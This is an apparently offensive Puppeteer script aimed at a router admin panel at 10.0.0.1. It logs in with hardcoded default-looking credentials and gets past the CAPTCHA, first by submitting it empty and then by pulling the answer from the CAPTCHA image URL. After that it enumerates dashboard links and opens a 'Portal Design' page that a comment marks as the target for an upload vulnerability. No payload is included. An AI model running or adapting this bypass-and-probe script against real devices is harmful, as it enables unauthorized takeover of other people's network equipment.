const PUPPETEER = require('puppeteer');
const ROUTER = 'http://10.0.0.1';
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

(async () => {
  const b = await PUPPETEER.launch({headless: false, args: ['--no-sandbox', '--window-size=1280,720']});
  const p = await b.newPage();

  // Navigate to admin login
  await p.goto(ROUTER + '/admin/index', {waitUntil: 'domcontentloaded'});
  await sleep(3000);
  console.log('1. Login page loaded:', p.url());

  // Try logging in
  await p.type('#username', 'admin');
  await p.type('#password', '123456789');
  
  // Get captcha value from image
  const captchaText = await p.evaluate(() => {
    const img = document.querySelector('img[alt="CAPTCHA"]');
    return img ? img.src : 'not found';
  });
  console.log('2. Captcha URL:', captchaText);

  // Try empty captcha first
  await p.evaluate(() => {
    document.getElementById('captcha').value = '';
    document.getElementById('kt_login_signin_submit').click();
  });
  await sleep(5000);
  console.log('3. Post-login URL:', p.url());

  // Check if we got to dashboard
  const html = await p.evaluate(() => document.body.innerText.substring(0, 500)).catch(() => '');
  console.log('4. Page text:', html);

  // If still on login, try again with captcha value from the image
  if (p.url().includes('login') || p.url().includes('admin/index')) {
    console.log('5. Still on login, trying with captcha...');
    
    // Get the captcha image src - it might contain the answer
    const src = await p.evaluate(() => {
      const img = document.querySelector('img[alt="CAPTCHA"]');
      return img ? img.src : '';
    });
    console.log('6. Captcha source:', src);
    
    // Check if captcha answer is in the URL
    if (src && src.includes('=')) {
      const captchaAnswer = src.split('=').pop();
      console.log('7. Captcha answer:', captchaAnswer);
      
      await p.type('#captcha', captchaAnswer);
      await sleep(500);
      await p.evaluate(() => document.getElementById('kt_login_signin_submit').click());
      await sleep(5000);
      console.log('8. Post-login URL:', p.url());
      const html2 = await p.evaluate(() => document.body.innerText.substring(0, 500)).catch(() => '');
      console.log('9. Page text:', html2);
    }
  }
  
  // If logged in, explore the dashboard
  if (!p.url().includes('login')) {
    console.log('\n=== DASHBOARD ACCESSED ===');
    await sleep(2000);
    
    // Get all links/menu items
    const links = await p.evaluate(() => {
      const anchors = document.querySelectorAll('a, button, [onclick]');
      return Array.from(anchors).slice(0, 50).map(a => ({
        text: a.innerText?.substring(0, 100),
        href: a.href || a.getAttribute('onclick') || '',
        id: a.id
      }));
    });
    console.log('Links:', JSON.stringify(links, null, 2));
    
    // Try to find the Portal Design page for upload vulnerability
    // Navigate to Portal Design
    await p.goto(ROUTER + '/admin/index?action=portal', {waitUntil: 'domcontentloaded'}).catch(() => {});
    await sleep(3000);
    console.log('\nPortal URL:', p.url());
    const portalHtml = await p.evaluate(() => document.body.outerHTML.substring(0, 1000)).catch(() => '');
    console.log('Portal HTML:', portalHtml);
  }

  await sleep(30000);
  await b.close();
})();
